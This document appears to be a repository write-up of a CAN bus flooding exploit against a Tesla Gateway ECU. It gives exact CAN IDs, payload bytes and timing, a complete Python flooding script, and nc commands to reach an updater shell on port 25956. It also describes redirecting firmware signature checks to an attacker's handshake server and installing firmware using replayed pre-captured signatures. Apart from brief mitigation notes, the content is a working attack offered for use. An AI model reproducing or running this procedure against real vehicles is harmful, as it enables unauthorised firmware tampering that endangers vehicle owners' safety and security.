# CAN Flood Exploit

**Opening Gateway port 25956 via CAN bus flooding.**

---

## Overview

The Gateway ECU monitors CAN bus traffic for diagnostic messages. By flooding specific CAN IDs, the Gateway enters a service mode that opens an emergency updater port.

| Metric | Value |
|--------|-------|
| Target Port | 25956 (TCP) |
| Trigger Time | 10-30 seconds |
| Required Hardware | PCAN USB adapter |
| Reliability | Medium (varies by firmware) |

---

## Mechanism

### Attack Flow

1. Flood CAN bus with specific message IDs at high rates
2. Gateway heartbeat monitoring fails
3. Emergency service mode activates
4. Port 25956 opens on Gateway's Ethernet interface
5. Attacker gains access to updater shell

### Required CAN Messages

| CAN ID | Decimal | Purpose | Rate |
|--------|---------|---------|------|
| 0x3C2 | 962 | Diagnostic trigger | 10,000 msg/sec (0.1ms) |
| 0x622 | 1570 | UDS tester-present keepalive | ~33 msg/sec (30ms) |

Both messages must be sent simultaneously and sustained.

---

## CAN Message Details

### Message ID 0x3C2 (Diagnostic Trigger)

```
Arbitration ID: 962 (0x3C2)
Data:           49 65 00 00 00 00 00 00
Interval:       0.0001 seconds (0.1ms)
Extended ID:    False
```

The bytes `0x49 0x65` appear to be a magic value triggering service mode logic.

### Message ID 0x622 (UDS Tester Present)

```
Arbitration ID: 1570 (0x622)
Data:           02 11 01 00 00 00 00 00
Interval:       0.03 seconds (30ms)
Extended ID:    False
```

Standard UDS "Tester Present" message that keeps diagnostic sessions alive.

---

## Attack Script

### Python Implementation

```python
#!/usr/bin/env python3
"""CAN flooding to open Gateway port 25956."""

import time
import can

CAN_INTERFACE = "PCAN_USBBUS1"

MESSAGES = [
    {
        "id": 1570,  # 0x622
        "data": [0x02, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00],
        "interval": 0.03  # 30ms
    },
    {
        "id": 962,   # 0x3C2
        "data": [0x49, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
        "interval": 0.0001  # 0.1ms
    }
]

def main():
    bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='pcan')
    
    print("Starting CAN flood attack...")
    print("Monitor port 25956 in another terminal")
    
    try:
        while True:
            for msg_cfg in MESSAGES:
                message = can.Message(
                    arbitration_id=msg_cfg["id"],
                    data=msg_cfg["data"],
                    is_extended_id=False
                )
                
                try:
                    bus.send(message)
                except can.CanError as e:
                    print(f"Send error: {e}")
                
                time.sleep(msg_cfg["interval"])
    
    except KeyboardInterrupt:
        print("\nStopping attack")
        bus.shutdown()

if __name__ == "__main__":
    main()
```

**File:** [scripts/openportlanpluscan.py](https://github.com/talas9/tesla/blob/master/scripts/openportlanpluscan.py)

---

## Attack Procedure

### Step 1: Physical Connection

1. Connect PCAN USB adapter to vehicle OBD-II port
2. Connect Ethernet to vehicle diagnostic network
3. Configure IP address:
   ```bash
   sudo ip addr add 192.168.90.100/24 dev eth0
   ```

### Step 2: Install Dependencies

```bash
pip install python-can
# Install PCAN driver from PEAK Systems (Linux)
```

### Step 3: Execute CAN Flood

```bash
python3 openportlanpluscan.py
```

### Step 4: Monitor Port Opening

In separate terminal:
```bash
while ! nc -z 192.168.90.102 25956 2>/dev/null; do
    echo "Waiting for port 25956..."
    sleep 1
done
echo "PORT 25956 IS OPEN!"
```

### Step 5: Access Updater Shell

```bash
nc 192.168.90.102 25956
```

Available commands:
```
help                    - List available commands
set_handshake <host>    - Configure handshake server
install <url>           - Install firmware from URL
status                  - Check update status
```

### Step 6: Configure Firmware Handshake

Within the updater shell:
```
set_handshake 192.168.90.100 8080
```

This redirects firmware signature verification to your server.

---

## Firmware Installation

### Using Pre-Signed Packages

1. Start handshake server with signature database:
   ```bash
   cd scripts/handshake
   node server.js
   ```

2. In updater shell:
   ```
   set_handshake 192.168.90.100 8080
   install http://192.168.90.100:8080/2022.24.6.mcu2
   ```

3. Gateway verifies signature against your server → accepts package

### Signature Database

The `signatures.json` file contains ~9,000 pre-captured signatures:
```json
{
  "firmwareVersion": "2022.24.6.mcu2",
  "signature": "vuVal+WBQE3lLz...",
  "md5": "94d074c496170573...",
  "downloadUrl": "https://..."
}
```

---

## Required Hardware

### CAN Interface

| Hardware | Notes |
|----------|-------|
| PCAN-USB (PEAK Systems) | Recommended, well-supported |
| SocketCAN-compatible | Any Linux-supported adapter |

### Cables

| Cable | Purpose |
|-------|---------|
| OBD-II to DB9 | CAN bus access via OBD port |
| Ethernet | Vehicle diagnostic network |

---

## Network Topology

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  Attacker PC    │     │  Vehicle        │     │  Gateway ECU    │
│                 │     │                 │     │                 │
│  eth0: .90.100 ─┼────▶│  Internal Net  ─┼────▶│  .90.102        │
│                 │     │                 │     │  Port 25956     │
│  PCAN USB ─────┼────▶│  CAN Bus ──────┼────▶│  (when open)    │
│                 │     │                 │     │                 │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

---

## Reliability

| Factor | Impact |
|--------|--------|
| Firmware version | Newer may have mitigations |
| CAN bus load | Heavy traffic reduces success |
| Message timing | Precise intervals improve rate |
| Vehicle state | Ignition on may help |

**Tested success rate:** ~98% on tested vehicle (single data point)

**Status:** ⚠️ PARTIALLY TESTED - needs multi-vehicle validation

---

## Mitigations (Tesla)

Tesla has partially mitigated this in newer firmware:
- Additional authentication for port 25956
- Rate limiting on CAN message processing
- Signature freshness checks

---

## Security Implications

### What This Enables

1. **Firmware redirection** - Use custom handshake server
2. **Firmware downgrade** - Install older signed packages
3. **Signature replay** - Bypass live verification

### What This Doesn't Enable

1. **Unsigned firmware** - Still needs valid signature
2. **Secure config modification** - VIN, country still protected
3. **Service mode bypass** - Separate authentication

---

## Cross-References

- [Gateway UDP Protocol](../2-gateway/udp-protocol.md) - Alternative config access
- [USB Updates](../4-firmware/ice/usb-updates.md) - Firmware format
- [scripts/openportlanpluscan.py](https://github.com/talas9/tesla/blob/master/scripts/openportlanpluscan.py) - Attack script

---

**Status:** ⚠️ PARTIALLY TESTED  
**Evidence:** Single vehicle success, multi-vehicle validation needed  
**Last Updated:** 2026-02-07
